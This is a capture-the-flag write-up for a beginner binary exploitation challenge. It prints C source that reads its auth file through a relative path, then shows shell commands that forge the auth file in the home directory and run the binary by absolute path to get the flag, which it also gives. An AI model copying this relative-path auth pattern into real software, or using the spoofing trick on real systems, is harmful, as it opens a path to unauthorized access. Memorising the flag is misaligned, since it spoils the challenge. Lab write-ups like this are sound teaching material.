# Just No
## Level 1 - binary exploitation - 40 points

### Description
> A program at /problems/f49abea6827cafa20a035340d3812d09 has access to a flag but refuses to share it. Can you convince it otherwise?

### Hints
> * Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

### Solution

Connect with `ssh` then `cd` into `/problems/f49abea6827cafa20a035340d3812d09`. Executing `justno` prints this:

```
$ ./justno
auth file says no. So no. Just... no.
```

It talks about an `auth` file: it's in the same directory, you can `cat` it but is readonly, so we can't just edit it. There is also the source in `justno.c` file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv) {
    FILE* authf = fopen("../../problems/f49abea6827cafa20a035340d3812d09/auth","r"); //access auth file in ../../../problems/f49abea6827cafa20a035340d3812d09
    if(authf == NULL){
        printf("could not find auth file in ../../problems/f49abea6827cafa20a035340d3812d09/\n");
        return 0;
    }
    char auth[8];
    fgets(auth,8,authf);
    fclose(authf);
    if(strcmp(auth,"no")!=0){
        FILE* flagf;
        flagf = fopen("/problems/f49abea6827cafa20a035340d3812d09/flag","r");
        char flag[64];
        fgets(flag,64,flagf);
        printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
        fclose(flagf);
    }else{
        printf("auth file says no. So no. Just... no.\n");
    }
    return 0;
}
```

So the executable uses relative path to read the `auth` file, we can trick it recreating the same directory structure in our home directory and call `justno` from there. Let's craft the `auth` file first:

```sh
$ mkdir -p ~/problems/f49abea6827cafa20a035340d3812d09
$ echo yes > ~/problems/f49abea6827cafa20a035340d3812d09/auth
```

After write the file move into that directory and execute `justno` using absolute path:

```
$ cd ~/problems/f49abea6827cafa20a035340d3812d09
$ /problems/f49abea6827cafa20a035340d3812d09/justno
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 6882905ccde9eeceac01f98cb0260fc2
```

### Flag

```
6882905ccde9eeceac01f98cb0260fc2
```